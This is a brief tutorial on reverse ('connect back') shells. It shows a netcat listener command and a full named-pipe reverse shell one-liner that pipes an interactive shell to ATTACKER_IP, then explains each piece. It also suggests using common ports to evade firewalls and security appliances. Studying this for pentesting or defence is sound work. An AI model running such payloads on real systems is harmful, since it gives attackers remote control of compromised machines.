Sometimes referred to as connect back shell.

The connections initiate from the target system to the attacker's machine which can help avoid detection from network firewalls and other security appliances.

### How They Work

#### Set up a Netcat (nc) Listenter

Any port can be used to wait for a connection, but attackers and pentesters tend to use known ports used by other applications like 53, 80. 8080, 443, 139 or 445 to blend the reverse shell with legitimate traffic and avoid detection by security appliances.

```bash
nc -lvnp 443
```

#### Gaining Reverse Shell Access

Once we have our listener set, the attacker should execute a reverse shell payload. This payload usually abuses the vulnerability or unauthorized access granted by the attacker and executes a command that will expose the shell through the network.

There's a variety of payloads that will depended on the tools and OS of the compromised system.

### Pipe Reverse Shell

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

```bash
rm -f /tmp/f
```

This command removes any existing named pipe file located at /tmp/f/ which ensures that the script can create a new named pipe without conflicts.

```bash
mkfifo /tmp/f
```

This command creates a named pipe, or FIFO (first-in, first-out) at /tmp/f. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.

```bash
cat /tmp/f
```

This commands reads data from the named pipe. It waits for input that can be sent through the pipe.

```bash
| bash -i 2>&1
```

The output of cat is piped to a shell instance (bash -i) which allows the attacker to execute commands interactively. The 2>&1 directs standard error to standard output, ensuring that error messages are sent back to the attacker.

```bash
>/tmp/f 
```

This sends the output of the commands back into the named pipe, allowing bidirectional comms.

